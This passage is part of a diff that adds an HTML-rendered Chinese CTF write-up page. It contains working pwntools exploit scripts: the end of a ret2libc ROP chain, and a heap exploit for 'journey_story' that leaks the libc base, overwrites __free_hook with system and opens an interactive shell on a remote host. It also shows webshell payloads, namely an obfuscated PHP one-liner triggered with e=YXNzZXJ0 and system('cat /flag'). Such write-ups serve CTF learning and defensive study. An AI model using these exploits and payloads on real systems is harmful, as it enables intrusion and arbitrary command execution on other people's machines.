+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;Got libc_puts_addr ====&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_puts_addr&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;Got libc_base_addr ====&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_base_addr&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">64&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pop_rdi_ret&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">binsh&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_base_addr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_base_addr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Your info: &lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="journey_story">journey_story
+&lt;/h3>&lt;p>题目内容：&lt;/p>
+&lt;p>Record your journey, leave your story.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./journey_story&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;39.106.48.123&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;41557&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level=&amp;#39;debug&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">con&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Choose an option: &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;): &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;characters): &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">con&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Choose an option: &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;): &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">edit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">con&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Choose an option: &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;3&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;): &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;characters): &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">con&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">show&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;Choose an option: &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;4&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#unsorted bin leak libc base&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">edit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x91&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x90&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">edit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x91&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">show&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x90&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_base_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x61&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0xe0&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x7f76f9e69be0&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x7f76f9c7d000&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">free_hook_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_base_addr&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="mh">0x1EEE48&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_base_addr&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="mh">0x52290&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;libc_base_addr ====&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_base_addr&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;free_hook_addr ====&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">free_hook_addr&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;system_addr ====&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_addr&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">edit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x91&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xe0&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">edit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xb1&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dele&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xa8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">edit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x91&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">free_hook_addr&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x88&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_addr&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="c1">#3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># gdb.attach(io)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>interactive交互之后新建一个堆块，内容写/bin/sh回车，然后删除该堆块（本exp中堆块index应为5）&lt;/p>
+&lt;h2 id="web">WEB
+&lt;/h2>&lt;h3 id="ezfindshell">ezFindShell
+&lt;/h3>&lt;p>下载附件发现好多php代码，我们找找有没有可以利用的]
+&lt;code>grep -r --include='*.php' 'POST' /path/to/your/directory&lt;/code>
+找到了&lt;code>1de9d9a55a824f4f8b6f37af76596baa.php&lt;/code>
+注意&lt;code>$e=$REQUEST['e'];$arr=array($POST['POST'],);array_filter($arr,base64_decode($e));&lt;/code>
+这串代码是一句话变形马：首先使用REQUEST接收e参数传递的值,然后把&lt;code>$_POST['POST']&lt;/code>赋值给arr数组，然后把arr数组中的每个键值传给base64_decode处理后构成的回调函数
+我们只要让回调函数变成&lt;code>assert&lt;/code>，arr数组传入的值为&lt;code>system(&amp;quot;ls /&amp;quot;)&lt;/code>就好
+POST提交&lt;code>e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&lt;/code>
+看到flag，改下参数&lt;code>e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;cat /flag&amp;quot;)&lt;/code>&lt;/p>
+&lt;h3 id="cyberboard">cyberboard
+&lt;/h3>&lt;p>上来给了个登录框,用户名和密码如下&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">users&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
